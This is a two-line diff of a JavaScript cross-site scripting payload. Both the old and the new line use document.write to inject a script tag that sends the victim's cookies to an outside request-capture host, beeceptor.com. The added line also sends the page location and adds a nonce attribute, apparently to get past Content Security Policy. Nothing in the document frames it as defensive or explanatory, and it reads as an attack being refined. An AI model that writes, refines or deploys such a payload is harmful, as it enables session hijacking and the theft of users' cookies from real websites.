@@ -1,2 +1,3 @@
-document.write('<script src="https://recept.free.beeceptor.com?='+document.cookie+''"></script>');
+document.write('<script SRC = "https://recept.free.beeceptor.com?'+'location='+document.location+'&cookie='+document.cookie+'",nonce></script>');
+
 
